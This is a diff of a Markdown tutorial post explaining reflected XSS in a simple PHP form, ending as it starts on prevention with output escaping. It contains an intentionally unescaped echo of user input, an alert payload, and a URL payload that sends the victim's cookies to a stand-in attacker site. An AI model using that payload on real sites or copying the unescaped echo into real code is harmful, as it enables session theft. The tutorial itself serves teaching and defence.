@@ -11,6 +11,7 @@ tags:
   - PHP
 ---
 
+# Introduction
 So you've learned to create a PHP form recently and are very excited to set up a website with this form. You might think, "Ah, it's just a simple form, what could go wrong?". Well, you wouldn't be the first one to believe that. 
 
 So let's take a look at a simple form that I have written.
@@ -18,7 +19,7 @@ So let's take a look at a simple form that I have written.
 ```PHP
 <!DOCTYPE html>
 <html>
-	<body>
+<body>
 		<h1>Simple PHP Form</h1>
 		<form method="GET" action="<?php echo $_SERVER['PHP_SELF'];?>">
 			Name: <input type="text" name="fname">
@@ -29,7 +30,7 @@ So let's take a look at a simple form that I have written.
 				echo "<p>Hi " . $_GET['fname'] . "!</p>";
 			}
 		?>
-	</body>
+</body>
 </html>
 ```
 
@@ -43,7 +44,9 @@ After typing my name in the input box, we get the following output.
 
 Now you might be thinking that all is well and good, but what if someone submits the following text as input.
 
-```<b>Abhishek</b>```
+```HTML
+<b>Abhishek</b>
+```
 
 We get the following output.
 
@@ -51,13 +54,15 @@ We get the following output.
 
 Wait, what? So if you pass in an HTML tag, the output is modified based on the tag. This is because when the PHP code echos the content of 'fname,' the resulting HTML sent back from the server looks like this. 
 
-```<p>Hi <b>Abhishek</b>!</p>```
+```HTML
+<p>Hi <b>Abhishek</b>!</p>
+```
 
 This can be verified by looking at the source.
 
 ![Page-Source-Inject-1](../../assets/images/xss/inject-1.png)
 
-When the browser looks at the HTML, it sees the <b> tag and thinks that text in between is supposed to be rendered bold. The ability to pass in HTML code is known as HTML injection. This has a lot of implications (well other than being able to stylize your output). What if we want to pass in javascript code in the text field. Let's try the following input.
+When the browser looks at the HTML, it sees the `<b>` tag and thinks that text in between is supposed to be rendered bold. The ability to pass in HTML code is known as HTML injection. This has a lot of implications (well other than being able to stylize your output). What if we want to pass in javascript code in the text field. Let's try the following input.
 
 ```javascript
 <script>alert("test");</script>
@@ -70,7 +75,7 @@ So why did this happen? Well, this is because like in the previous example, we w
 
 ![Form-Source-JS](../../assets/images/xss/xss-1.png)
 
-When the browser sees the ```<script>``` tag, it immediately runs the codes in between. What we saw above is called Cross-Site Scripting (XSS), more specifically Reflected XSS. It is reflected since the script passed in as input is bounced from the web server back to the user's browser. 
+When the browser sees the `<script>` tag, it immediately runs the codes in between. What we saw above is called Cross-Site Scripting (XSS), more specifically Reflected XSS. It is reflected since the script passed in as input is bounced from the web server back to the user's browser. 
 
 So what can we do with this? An alert box might not be harmful to the user, but what about the case where the user is logged in. If we pass the following as input
 
@@ -91,9 +96,9 @@ http://vulnerable-website?param=<script>window.location="http://attackers-site.c
 
 The cookie is sent as a GET value which the attacker can then view on his/her server. 
 
-Well, how can we prevent the above attack? 
+# Well, how can we prevent the above attack? 
 Some of the ways we can prevent XSS are:
-Escaping all dynamic content, i.e., replace any characters that the browser will interpret with something called entities. For example, ```<``` is replaced with ```&lt;```. This means that when the page is returned back to the user, the browser sees ```&lt;```,  and renders it instead of interpreting it. Dynamic content is encoded by default by most modern frameworks. The following two functions can be used.
+Escaping all dynamic content, i.e., replace any characters that the browser will interpret with something called entities. For example, `<` is replaced with `&lt;`. This means that when the page is returned back to the user, the browser sees `&lt;`,  and renders it instead of interpreting it. Dynamic content is encoded by default by most modern frameworks. The following two functions can be used.
 
 ```
 htmlspecialchars(): encodes special characters to HTML entities,
